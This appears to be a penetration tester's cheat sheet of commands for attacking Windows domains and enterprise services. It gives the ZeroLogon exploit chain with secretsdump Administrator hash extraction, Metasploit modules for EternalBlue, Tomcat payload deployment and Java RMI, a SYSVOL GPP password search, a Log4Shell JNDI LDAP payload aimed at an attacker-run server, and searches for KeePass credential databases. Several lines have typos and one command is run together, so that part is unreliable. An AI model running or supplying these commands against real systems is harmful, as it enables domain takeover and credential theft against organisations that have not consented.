### ZeroLogon (CVE-2020-1472)
- check for ZeroLogon vulnerability
```
`zerologon-scan '<DC_NETBios_NAME>' '<IP>'`
```
- Exploit 
```
python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <IP> secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>\$@<IP> -no-pass-just-dc-user "Administrator"
```
- Admin Hash extraction
```
secretsdump.py -hashes :<ADMIN_HASH> <DOMAIN>/Administrator@<IP>
```
- Restore password
```
python3 restorepassword.py -target-ip <IP> <DOMAIN>/<MACHINE_BIOS_NAME> -hexpass <HEXPASS>
```
### EternalBlue (MS17-010)
- Metasploit module for exploitation
```
exploit/windows/smb/ms17_010_eternalblue
```
### SYSBOL & GPP (MS14-025)
- Use scanners like scanner/smb/smb_enum_gpp toenumerate fulnerabilities
- Search for credentials in SYSVOL shared policies with 
```
findstr /S /I /p password /v <FQDN>\sysvol\<FQDN>\polocies\*.xml
```
### Tomcat/JBoss Management
- Metasploit modules
	- auxiliary/scanner/http/tomcat_enum
	- For exploitation and deploying payloads
		- exploit/multi/http/tomcat_mgr/deploy
### Java RMI
- Tools
	- auxiliary/misc/java_rmi_server
	- Tools like ysoserial for deserialization exploits
### ProxyLogom, ProxyShell & Log4Shell Exploits
- ProxyLogon
	- Use published exploits for the ProxyLogon vulnerability in Microsoft Exchange
- Log4Shell Exploit
	- Use rogue-jndi-1.0.jar to set up an LDAP refrence server 
```
${jndi:ldap://<IP>:<PORT>/o=reference}
```
### Database Credentials
- Enumerate MSSQL logins to gain potential credentials
	- admin/mssql/mssql_enum_sql_logins
### Finding KDBX files
- Windows
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- Linux
```
find / -name *.kdbx 2>/dev/null
```
